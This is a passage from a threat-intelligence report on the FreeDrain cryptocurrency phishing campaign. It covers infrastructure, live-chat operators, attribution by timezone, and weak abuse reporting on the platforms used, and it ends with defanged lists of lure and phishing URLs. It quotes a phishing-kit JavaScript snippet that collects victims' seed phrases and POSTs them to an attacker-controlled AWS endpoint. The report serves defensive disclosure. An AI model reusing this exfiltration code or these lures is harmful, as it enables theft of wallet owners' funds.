+<figure id="attachment_121018" aria-describedby="caption-attachment-121018" style="width: 1535px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19.jpg" alt="DNS history for scientcontopped[.]com prior to expiration (2024)" width="1535" height="933" class="size-full wp-image-121018" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19.jpg 1535w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-300x182.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-1024x622.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-768x467.jpg 768w" sizes="auto, (max-width: 1535px) 100vw, 1535px" /><figcaption id="caption-attachment-121018" class="wp-caption-text">DNS history for <em>scientcontopped[.]com</em> prior to expiration (2024)</figcaption></figure>
+<p>The domain resolved to only a handful of IPs over its active life suggesting stable, centralized hosting infrastructure.</p>
+<p>Pivoting on IP addresses shared by these older FreeDrain domains revealed that there are hundreds of other domain names that share nearly identical characteristics in terms of naming conventions, registration patterns, and hosting patterns. Yet, these other domains didn’t exhibit direct ties to FreeDrain behavior.</p>
+<figure id="attachment_121021" aria-describedby="caption-attachment-121021" style="width: 1526px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16.jpg" alt="Pivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits" width="1526" height="942" class="size-full wp-image-121021" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16.jpg 1526w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-300x185.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-1024x632.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-768x474.jpg 768w" sizes="auto, (max-width: 1526px) 100vw, 1526px" /><figcaption id="caption-attachment-121021" class="wp-caption-text">Pivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits</figcaption></figure>
+<p>This led us to two possibilities:</p>
+<ol>
+<li aria-level="1">The redirectors are part of a leased infrastructure-as-a-service model, used by FreeDrain and potentially many other threat actors</li>
+<li aria-level="1">FreeDrain is a subdivision of a broader operation, with shared tooling and infrastructure but distinct campaigns</li>
+</ol>
+<p>At this stage, the full extent of this infrastructure and the relationships between campaigns remain an open research question. What is clear, however, is that FreeDrain does not operate in isolation, and the redirection layer may be a service used by multiple actors.</p>
+<h2>Phishing Pages</h2>
+<p>Across our monitoring, we observed dozens of variations in FreeDrain phishing pages but technically, they were all fairly simple and consistent in architecture.</p>
+<p>These phishing pages were most often:</p>
+<ul>
+<li aria-level="1">Hosted on cloud infrastructure, primarily Amazon S3 and Azure Web AppsDesigned to mimic legitimate cryptocurrency wallet interfaces (Trezor, MetaMask, Ledger, etc.)</li>
+<li aria-level="1">Implemented using HTML forms or AJAX POST requests to transmit stolen credentials to attacker-controlled endpoints</li>
+</ul>
+<figure id="attachment_121006" aria-describedby="caption-attachment-121006" style="width: 1594px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7.jpg" alt="A typical FreeDrain phishing page served from an S3 bucket, delivering only static content" width="1594" height="915" class="size-full wp-image-121006" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7.jpg 1594w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-300x172.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-1024x588.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-768x441.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-1536x882.jpg 1536w" sizes="auto, (max-width: 1594px) 100vw, 1594px" /><figcaption id="caption-attachment-121006" class="wp-caption-text">A typical FreeDrain phishing page served from an S3 bucket, delivering only static content</figcaption></figure>
+<p>Some S3-hosted phishing sites sent harvested data to live backend services on Azure, as seen in multiple instances where form actions pointed to azurewebsites.net applications.</p>
+<figure id="attachment_121020" aria-describedby="caption-attachment-121020" style="width: 860px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17.jpg" alt="The form for an S3-hosted FreeDrain phishing page posts to “/send.php” running in Azure" width="860" height="240" class="size-full wp-image-121020" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17.jpg 860w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17-300x84.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17-768x214.jpg 768w" sizes="auto, (max-width: 860px) 100vw, 860px" /><figcaption id="caption-attachment-121020" class="wp-caption-text">The form for an S3-hosted FreeDrain phishing page posts to <em>&#8220;/send.php&#8221;</em> running in Azure</figcaption></figure>
+<h3>Human Operators Behind the Scenes</h3>
+<p>While most pages used standard static phishing techniques, we occasionally encountered live chat widgets embedded in Azure-hosted phishing pages.</p>
+<p>This chat feature had previously been documented in <a href="https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing" target="_blank" rel="noopener noreferrer">a 2022 report by Netskope</a> (one of the few references we ever found to FreeDrain and the earliest reported). Our own interactions confirmed that humans, not bots, were responding to victim inquiries in real time, often providing reassurance or technical &#8220;help&#8221; to keep targets engaged.</p>
+<figure id="attachment_121022" aria-describedby="caption-attachment-121022" style="width: 1505px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15.jpg" alt="Live chat interaction on a phishing page hosted in Azure" width="1505" height="1134" class="size-full wp-image-121022" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15.jpg 1505w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-768x579.jpg 768w" sizes="auto, (max-width: 1505px) 100vw, 1505px" /><figcaption id="caption-attachment-121022" class="wp-caption-text">Live chat interaction on a phishing page hosted in Azure</figcaption></figure>
+<h3>Clean, Unobfuscated Exfiltration Code</h3>
+<p>In the malicious JavaScript that we observed that handled POST requests with stolen seed phrases, the code is well-formatted, commented, and does not appear to be obfuscated in any way. Full examples are provided in the appendix, but a snippet of the POST request is below (domain bolded and defanged):</p>
+<pre>
+const data = {};
+inputs.forEach((input, index) => {
+    data[`phrase${index}`] = input.value.trim();
+});
+data.subject = "Trezor connect2";
+data.message = "Successfull fetch data";
+$.ajax({
+    type: "POST",
+    url: "<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>",
+    dataType: "json",
+    crossDomain: true,
+    contentType: "application/json; charset=utf-8",
+    data: JSON.stringify(data),
+    success: function (result) {
+        alert('Data submitted successfully1!');
+        window.location.href = 'https://suite.trezor.io/web/';
+        location.reload();
+    },
+    error: function (xhr, status, error) {
+        window.location.href = 'https://suite.trezor.io/web/';
+&nbsp;
+&nbsp;
+}
+});
+</pre>
+<p>Despite its simplicity, the phishing backend was effective, disposable, and often difficult to trace—highlighting just how low the bar is for technical sophistication when paired with wide-scale reach and persistent lure infrastructure.</p>
+<h2>Actor Analysis</h2>
+<p>Attribution is inherently difficult when infrastructure is ephemeral and built on shared, free-tier services. Yet through a combination of repository metadata, behavioral signals, and timing artifacts, we were able to extract meaningful insights about FreeDrain&#8217;s operators, including likely location, working patterns, and their degree of operational coordination.</p>
+<p>Our first major breakthrough came from GitHub Pages (<code>github.io</code>), which only allows hosting via a public repository that matches the account’s GitHub username (e.g., <code>username.github.io</code>). This constraint meant every active FreeDrain lure page hosted on GitHub had a publicly accessible repository behind it.</p>
+<p>We cloned hundreds of these repositories and analyzed the commit metadata, including timestamps, usernames, email addresses, and whether commits were made via the CLI or web interface. Several clear patterns emerged:</p>
+<ul>
+<li aria-level="1">Email addresses were always unique, tied 1:1 with the GitHub account, and never reused.</li>
+<li aria-level="1">All emails came from free providers like Gmail, Hotmail, Outlook, and ProtonMail.</li>
+<li aria-level="1">While naming styles varied widely (capitalization, numbers, patterns), we found clusters of similarly structured addresses, suggesting manual creation by multiple individuals, possibly using shared templates or naming approach.</li>
+</ul>
+<figure id="attachment_121014" aria-describedby="caption-attachment-121014" style="width: 366px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg" alt="Sample of email addresses found in FreeDrain-associated Github commit" width="366" height="632" class="size-full wp-image-121014" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg 366w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22-174x300.jpg 174w" sizes="auto, (max-width: 366px) 100vw, 366px" /><figcaption id="caption-attachment-121014" class="wp-caption-text">Sample of email addresses found in FreeDrain-associated Github commit</figcaption></figure>
+<p>Importantly, GitHub commits preserve the local timezone of the user unless manually configured otherwise. In our dataset, over 99% of commits were timestamped in UTC+05:30 (Indian Standard Time), our first strong geographic indicator.</p>
+<figure id="attachment_121008" aria-describedby="caption-attachment-121008" style="width: 886px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5.jpg" alt="Over 99% of the commits analyzed were localized to UTC+05:30" width="886" height="511" class="size-full wp-image-121008" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5.jpg 886w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5-300x173.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5-768x443.jpg 768w" sizes="auto, (max-width: 886px) 100vw, 886px" /><figcaption id="caption-attachment-121008" class="wp-caption-text">Over 99% of the commits analyzed were localized to UTC+05:30</figcaption></figure>
+<p>We corroborated this signal using metadata from other FreeDrain free-infrastructure/services. Webflow, for instance, embeds a &#8220;last published&#8221; timestamp in the HTML source of hosted sites. When we aggregated timestamps across the many FreeDrain Webflow pages, a clear 9-to-5 weekday work pattern emerged, complete with a consistent midday break. This pattern aligns closely with a standard business schedule in the IST timezone.</p>
+<figure id="attachment_121025" aria-describedby="caption-attachment-121025" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg" alt="Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30" width="1999" height="1180" class="size-full wp-image-121025" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121025" class="wp-caption-text">Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30</figcaption></figure>
+<figure id="attachment_121013" aria-describedby="caption-attachment-121013" style="width: 1055px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg" alt="Webflow embeds publish timestamps into the HTML source code of published websites" width="1055" height="598" class="size-full wp-image-121013" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg 1055w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-300x170.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-1024x580.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-768x435.jpg 768w" sizes="auto, (max-width: 1055px) 100vw, 1055px" /><figcaption id="caption-attachment-121013" class="wp-caption-text">Webflow embeds publish timestamps into the HTML source code of published websites</figcaption></figure>
+<p>Combining these and other signals across platforms, we assess with high confidence that FreeDrain is operated by individuals based in the IST timezone, likely in India, working standard weekday hours.</p>
+<p>Additionally, timeline analysis shows that FreeDrain has been active since at least 2022, with a notable acceleration in mid-2024. As of this writing, the campaign remains active across several free hosting and publishing platforms.</p>
+<figure id="attachment_121011" aria-describedby="caption-attachment-121011" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg" alt="Confirmed “last published” times, by date" width="1999" height="1180" class="size-full wp-image-121011" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121011" class="wp-caption-text">Confirmed “last published” times, by date</figcaption></figure>
+<h2>Disruption Efforts and Opportunities</h2>
+<p>The scale and diversity of services abused by FreeDrain made disruption an ongoing challenge. While the campaign leaned heavily on free-tier platforms, many of which allowed users to publish images, text, external links, and even custom JavaScript to subdomains under well-known parent domains, very few of these platforms offered streamlined abuse reporting workflows.</p>
+<p>In most cases, there was no direct method to report malicious content from the content page itself, forcing us to manually investigate each platform’s policies, support forms, or contact channels. This adds unnecessary friction to the response process, especially when scaled across hundreds of active malicious pages.</p>
+<p>Even more concerning, most of the publishing platforms lacked the detection capabilities to identify this type of coordinated abuse on their own. The indicators were there: repetitive naming patterns, clustered behavior, identical templates reused across subdomains, but limited proactive action was being taken.</p>
+<p>This highlights a broader industry need:</p>
+<ul>
+<li>Free-tier content platforms should invest in basic abuse prevention tooling and more accessible reporting mechanisms.</li>
+</ul>
+<p>At minimum, this includes:</p>
+<ul>
+<li aria-level="1">Allowing abuse to be reported directly from published content pages</li>
+<li aria-level="1">Monitoring for patterns of misuse (e.g., bulk account creation, similar domain structures, repeated hosting of external phishing kits)</li>
+<li aria-level="1">Establishing direct communication lines with trusted threat intel analysts and threat researchers</li>
+</ul>
+<p>FreeDrain’s reliance on free-tier platforms is not unique, and without better safeguards, these services will continue to be weaponized at scale.</p>
+<p>This isn’t just a security issue, it’s a business one. When threat actors abuse these platforms to host phishing pages, fake login portals, or crypto scams, they erode user trust in the entire platform domain. Over time, this leads to real financial consequences:</p>
+<ul>
+<li aria-level="1"><strong>Reputation damage:</strong> Reputable domain names like <code>webflow.io</code>, and <code>teachable.com</code> can quickly become flagged by corporate security tools, browser warning systems, and threat intelligence feeds. This reduces their utility for legitimate users and undermines the brand’s credibility.</li>
+<li aria-level="1"><strong>Deliverability and discoverability</strong>: Once a platform’s domain is associated with widespread abuse, search engines, email providers, and social networks may down-rank or block links from that domain, hurting all users, including paying customers.</li>
+<li aria-level="1"><strong>Customer churn and support burden</strong>: Abuse-driven issues often result in a higher volume of customer support tickets, complaints, and refunds, particularly when paying users find their content mistakenly flagged or blocked due to a shared domain reputation.</li>
+<li aria-level="1"><strong>Increased infrastructure and fraud costs</strong>: Hosting abusive content, even at scale on free tiers, still consumes compute, storage, and bandwidth. Worse, it may attract waves of automated account signups and resource abuse that raise operational costs.</li>
+</ul>
+<p>Failing to detect and mitigate this kind of abuse isn’t just a user risk– it’s an unpaid tax on the business, dragging down growth and trust at every layer. Proactive abuse prevention and streamlined reporting are not just table stakes for security, they’re critical to long-term sustainability.</p>
+<h2>References and Similarities to Other Campaigns</h2>
+<p>Elements of the FreeDrain campaign were first publicly documented in <a href="https://www.netskope.com/blog/abusing-google-sites-and-microsoft-azure-for-crypto-phishing" target="_blank" rel="noopener noreferrer">August 2022 by Netskope</a>, with <a href="https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing" target="_blank" rel="noopener noreferrer">a follow-up report</a> in September 2022. Netskope’s early findings captured the core tactics that continue today: leveraging SEO manipulation to drive traffic to lure pages, which then redirect to credential-harvesting phishing sites. Netskope also published another <a href="https://www.netskope.com/blog/attackers-target-crypto-wallets-using-codeless-webflow-phishing-pages" target="_blank" rel="noopener noreferrer">update in October 2024</a>, focusing on FreeDrain’s use of Webflow-hosted infrastructure, confirming the campaign’s continued evolution while retaining the same fundamental workflow.</p>
+<p>FreeDrain’s abuse of legitimate free-tier platforms is part of a broader trend in phishing infrastructure, but it remains distinct from other well-known crypto phishing efforts. For example, the CryptoCore campaign, <a href="https://decoded.avast.io/martinchlumecky1/cryptocore-unmasking-the-sophisticated-cryptocurrency-scam-operations/" target="_blank" rel="noopener noreferrer">reported by Avast</a> in August 2024, similarly targets cryptocurrency users but relies heavily on YouTube content and impersonation videos to draw in victims, rather than search engine poisoning and static phishing sites.</p>
+<p>In 2023, <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/its-raining-phish-and-scams-how-cloudflare-pages-dev-and-workers-dev-domains-get-abused/" target="_blank" rel="noopener noreferrer">Trustwave reported</a> on the use of Cloudflare’s pages.dev and workers.dev services in phishing, showing how modern hosting platforms that offer free, customizable subdomains with minimal friction are being systematically exploited, mirroring FreeDrain’s approach.</p>
+<p>Recent reporting has also shed light on the kinds of threat actors that may be behind campaigns like FreeDrain. Just this week, the U.S. Treasury<a href="https://home.treasury.gov/news/press-releases/sb0129" target="_blank" rel="noopener noreferrer"> sanctioned individuals linked to cyber scam operations in Southeast Asia</a>, specifically a militia group in Burma involved in online fraud networks. While distinct from FreeDrain, these operations share similar hallmarks: large-scale abuse of online infrastructure, technical capability, and a focus on financial theft, demonstrating the scale and organization such campaigns can operate under.</p>
+<p>FreeDrain’s techniques have also been informally documented by affected users. In particular, Trezor hardware wallet customers have reported fraudulent websites mimicking the Trezor ecosystem, some of which were part of FreeDrain’s infrastructure:</p>
+<ul>
+<li aria-level="1"><a href="https://forum.trezor.io/t/reporting-scam-site/20284" target="_blank" rel="noopener noreferrer">Forum report: Reporting scam site</a></li>
+<li aria-level="1"><a href="https://forum.trezor.io/t/fake-trezor-websites/173/5" target="_blank" rel="noopener noreferrer">Forum discussion: Fake Trezor websites</a></li>
+</ul>
+<h2>Conclusion</h2>
+<p>The FreeDrain network represents a modern blueprint for scalable phishing operations, one that thrives on free-tier platforms, evades traditional abuse detection methods, and adapts rapidly to infrastructure takedowns. By abusing dozens of legitimate services to host content, distribute lure pages, and route victims, FreeDrain has built a resilient ecosystem that’s difficult to disrupt and easy to rebuild.</p>
+<p>Through detailed infrastructure analysis, repository metadata mining, and cross-platform behavioral correlations, we uncovered rare insights into the actors behind the campaign, including strong indicators that the operation is manually run by a group based in the UTC+05:30 timezone, working standard business hours. Despite this visibility, systemic weaknesses in reporting mechanisms and abuse detection have allowed FreeDrain to persist and even accelerate in 2024.</p>
+<p>This is not just a FreeDrain problem. The broader ecosystem of free publishing platforms is being exploited in ways that disproportionately benefit financially motivated threat actors. Without stronger default safeguards, identity verification, or abuse response infrastructure, these services will continue to be abused, undermining user trust and inflicting real-world financial harm.</p>
+<p>By exposing the scale and structure of the FreeDrain network, we hope this research will enable better platform-level defenses, more informed user education, and collaboration across the security community to limit the reach and longevity of operations like this.</p>
+<h2>Indicators of Compromise and Relations</h2>
+<p><a href="https://github.com/Validin/indicators/tree/master/FreeDrain" target="_blank" rel="noopener noreferrer">Full List of IOCs can be downloaded here</a>.</p>
+<h3>FreeDrain Lure Pages</h3>
+<p>Download Full List for over 40,000 URLs<br />
+Sample:</p>
+<p>https://metamaskchromextan.gitbook\.io/us<br />
+https://suprt-ios-trzorhard.gitbook\.io/en-us<br />
+https://bridge-tziuur.gitbook\.io/en-us<br />
+https://auth-ledger-com-cdn.webflow\.io/<br />
+https://start&#8212;leddger-cdn-auth.webflow\.io/<br />
+https://help&#8211;ledgre-auth-us.webflow\.io/<br />
+https://home-trezsor-start.gitbook\.io/en-us<br />
+https://wlt-phantom-wlt.webflow\.io/<br />
+https://bridge-cen-trezseer.gitbook\.io/en-us<br />
+https://ledgerauth-wellat.webflow\.io/<br />
+https://ledgerivwaselet-us.webflow\.io/<br />
+https://extentrust.gitbook\.io/en-us<br />
+https://truststextion.gitbook\.io/us<br />
+https://apps-support&#8212;mettmask.gitbook\.io/us<br />
+https://cobo-wallet-digital-cdm.webflow\.io/<br />
+https://extension&#8211;metaamsk-info.gitbook\.io/us<br />
+https://bridge-docs&#8211;trzc.gitbook\.io/en-us<br />
+https://suite-trezoreio.gitbook\.io/us<br />
+https://auth&#8211;io-coinbausehelp.gitbook\.io/us<br />
+https://help-blockf-cdnn.teachable\.com/p/home</p>
+<h3>FreeDrain Redirect Domains</h3>
+<p>These are the redirector domains we directly observed leveraged by FreeDrain going back 3+ years.</p>
+<p>affanytougees[.]com<br />
+ameddingpersusan[.]com<br />
+anicnicpriesert[.]com<br />
+antressmirestos[.]com<br />
+aparingupgger[.]com<br />
+bildherrywation[.]com<br />
+boutiondistan[.]com<br />
+brasencewompture[.]com<br />
+carefersoldidense[.]com<br />
+causesconighty[.]com<br />
+charweredrepicks[.]com<br />
+chazineconally[.]com<br />
+chierstimines[.]com<br />
+chopedansive[.]com<br />
+claredcarcing[.]com<br />
+coadormertranegal[.]com<br />
+coateethappallel[.]com<br />
+comaincology[.]com<br />
+coneryconstiny[.]com<br />
+conkeyprowse[.]com<br />
+coutioncargin[.]com<br />
+coveryinting[.]com<br />
+crefoxappecture[.]com<br />
+curphytompared[.]com<br />
+darylapsebaryanmar[.]com<br />
+deconsorconsuperb[.]com<br />
+disantumcomptions[.]com<br />
+distrypromited[.]com<br />
+escentdeveriber[.]com<br />
+fladestateins[.]com<br />
+flesterwisors[.]com<br />
+forrofilecabelle[.]com<br />
+gaiterimturches[.]com<br />
+goestodos[.]com<br />
+grawableaugespare[.]com<br />
+gresesticparray[.]com<br />
+guardawalle[.]com<br />
+hunnerdimental[.]com<br />
+issetheserepson[.]com<br />
+lamothyadjuncan[.]com<br />
+leatlyinsioning[.]com<br />
+leavesnottered[.]com<br />
+listationsomminder[.]com<br />
+litnentschelds[.]com<br />
+minarymacrefeat[.]com<br />
+mingaryshestence[.]com<br />
+nashiclehunded[.]com<br />
+obiansvieller[.]com<br />
+paticableharent[.]com<br />
+penlabuseoribute[.]com<br />
+peridneyperadebut[.]com<br />
+pladamousaribached[.]com<br />
+posectsinsive[.]com<br />
+pringingsernel[.]com<br />
+saverateaubtle[.]com<br />
+scientcontopped[.]com<br />
+screnceagrity[.]com<br />
+searranksdeveal[.]com<br />
+shotheatsgnovel[.]com<br />
+sonyonsa[.]com<br />
+stalitynotinium[.]com<br />
+storsianpreemed[.]com<br />
+swissborglogi[.]xyz<br />
+teleedlescestable[.]com<br />
+tirzrstartio[.]com<br />
+topsorthynaveneur[.]com<br />
+tralizetrulines[.]com<br />
+trighlandcomping[.]com<br />
+versaryconnedges[.]com<br />
+walitykildsence[.]com<br />
+wintrolancing[.]com</p>
+<h3>Phishing URLs</h3>
+<p>https://atomicwallet.azurewebsites[.]net/<br />
+https://bietbutylogn.azurewebsites[.]net/<br />
+https://biokefeiwltliv29gleed.azurewebsites[.]net/<br />
+https://bitgetwalt.azurewebsites[.]net/<br />
+https://bleuckfie-coins.azurewebsites[.]net/<br />
+https://bleuckkfiecoins.azurewebsites[.]net/<br />
+https://bleuickkfiescoins.azurewebsites[.]net/<br />
+https://blocckfi-api.azurewebsites[.]net/<br />
+https://blocikifi.azurewebsites[.]net/<br />
+https://blockffiecoinas.azurewebsites[.]net/<br />
+https://blockfi-api.azurewebsites[.]net/<br />
+https://blockfiapp-apk.azurewebsites[.]net/<br />
+https://blockfiicoins.azurewebsites[.]net/<br />
+https://blockificoinz.azurewebsites[.]net/<br />
+https://blockifiicoins.azurewebsites[.]net/<br />
+https://blockkfi-api.azurewebsites[.]net/<br />
+https://blockkfiapi-apk.azurewebsites[.]net/<br />
+https://blockkkfifies.azurewebsites[.]net/<br />
+https://bloickfie-app.azurewebsites[.]net/<br />
+https://bloickfiicoins.azurewebsites[.]net/<br />
+https://bloickkfieecoinss.azurewebsites[.]net/<br />
+https://bloickkfieescoins876.azurewebsites[.]net/<br />
+https://bloiickkfieecoinase.azurewebsites[.]net/<br />
+https://blokfi-error.azurewebsites[.]net/<br />
+https://blokkfiapp-api.azurewebsites[.]net/<br />
+https://blokkifi.azurewebsites[.]net/<br />
+https://bloockkfi-api.azurewebsites[.]net/<br />
+https://blouckfi-api.azurewebsites[.]net/<br />
+https://bluckfi-error.azurewebsites[.]net/<br />
+https://bluckfilogn.azurewebsites[.]net/<br />
+https://blueckficoinis.azurewebsites[.]net/<br />
+https://bluickkfiecoins.azurewebsites[.]net/<br />
+https://boloickfieecoins.azurewebsites[.]net/<br />
+https://buloickkfieecoins876.azurewebsites[.]net/<br />
+https://cbswlterliv487wlt.azurewebsites[.]net/<br />
+https://cionbise-error.azurewebsites[.]net/<br />
+https://cnbse13liv.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://cobo-wallet.azurewebsites[.]net/<br />
+https://cobowalletoffc.azurewebsites[.]net/<br />
+https://cobowalletz.azurewebsites[.]net/<br />
+https://coienebaiseerlivwlt02elisa.azurewebsites[.]net/<br />
+https://coinibisasesn567.azurewebsites[.]net/<br />
+https://dft0-hjgkd26-fkj.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://edgeronwlet.azurewebsites[.]net/<br />
+https://edgersuwlet.azurewebsites[.]net/<br />
+https://eedu0s-jhdc-osxza.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://en-ledger-cdn.azurewebsites[.]net/<br />
+https://en-trezor-cdn-auth.azurewebsites[.]net/<br />
+https://en-trezor-cdn.azurewebsites[.]net/<br />
+https://errorciiobiosewds876.azurewebsites[.]net/<br />
+https://errorcoibisaeseaenbaeb876.azurewebsites[.]net/<br />
+https://errorlovblockfi876.azurewebsites[.]net/<br />
+https://errorlovbloikcffie876.azurewebsites[.]net/<br />
+https://errorlovbolockfiee987.azurewebsites[.]net/<br />
+https://errorlovcobisaed786.azurewebsites[.]net/<br />
+https://errorlovcoibioise876.azurewebsites[.]net/<br />
+https://errorlovexdkekam879.azurewebsites[.]net/<br />
+https://errorlovexds987.azurewebsites[.]net/<br />
+https://errorlovtenizr987.azurewebsites[.]net/<br />
+https://errorlovtrasenzjedsuties.azurewebsites[.]net/<br />
+https://errorlovtreazezz876.azurewebsites[.]net/<br />
+https://errorlovtrikmanen987.azurewebsites[.]net/<br />
+https://errormetiamiasks876.azurewebsites[.]net/<br />
+https://errormetismesk987.azurewebsites[.]net/<br />
+https://errortreazeeasd-suties.azurewebsites[.]net/<br />
+https://ertzirdnwwltliv.azurewebsites[.]net/<br />
+https://exd98uswlterliv.azurewebsites[.]net/<br />
+https://exdiusiwalet.azurewebsites[.]net/<br />
+https://ezioron1wlet.azurewebsites[.]net/<br />
+https://iotruzorsuite.azurewebsites[.]net/<br />
+https://itrusttcepitalcoins.azurewebsites[.]net/<br />
+https://kaikzx-slsld39-lkjf.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://krakenzcoins.azurewebsites[.]net/<br />
+https://ladzearwlt03jokesmko.azurewebsites[.]net/<br />
+https://ldr-0gr-dsxz.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://leddgeircoins.azurewebsites[.]net/<br />
+https://leddgersacoins.azurewebsites[.]net/<br />
+https://ledeagderwallet.azurewebsites[.]net/<br />
+https://ledg-01jghe0fhdk.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://ledgar-live-walliet.s3.us-east-2.amazonaws[.]com/index.html<br />
+https://ledger-start-403.azurewebsites[.]net/<br />
+https://ledger-start-api.azurewebsites[.]net/<br />
+https://ledgercoinserror3.azurewebsites[.]net/<br />
+https://ledgercoinsweb3.azurewebsites[.]net/<br />
+https://ledgersapi-apk.azurewebsites[.]net/<br />
+https://ledgersapp.azurewebsites[.]net/<br />
+https://ledgirlvestart.azurewebsites[.]net/<br />
+https://ledigerwaliteasee.azurewebsites[.]net/<br />
+https://ledzaererwltliv30mariamon.azurewebsites[.]net/<br />
+https://ledzor365livwlter.azurewebsites[.]net/<br />
+https://legdrlievlgin.azurewebsites[.]net/<br />
+https://leidgeierwalitese.azurewebsites[.]net/<br />
+https://leidgirscoinsweb.azurewebsites[.]net/<br />
+https://leldger-live.azurewebsites[.]net/<br />
+https://lezor3021sxes.azurewebsites[.]net/<br />
+https://lfg0-oiosh-hdh.s3.us-east-1.amazonaws[.]com/index.html<br />
+https://lgnwltcnbsliv.azurewebsites[.]net/<br />
+https://lledgerwallest.azurewebsites[.]net/<br />
+https://lzr13wlt.s3.eu-north-1.amazonaws[.]com/index.html<br />
+https://metamaskdn.azurewebsites[.]net/<br />
+https://metamasksrs.azurewebsites[.]net/<br />
+https://metamassk.azurewebsites[.]net/<br />
+https://mmetamassk.azurewebsites[.]net/<br />
+https://mtmsklivwlter57wlt.azurewebsites[.]net/<br />
+https://ndaaxscoins.azurewebsites[.]net/<br />
+https://ndaxcoins.azurewebsites[.]net/<br />
+https://ndeauxcoinsweb.azurewebsites[.]net/<br />
+https://neaiaxcoins.azurewebsites[.]net/<br />
+https://oduisshweb3.azurewebsites[.]net/<br />
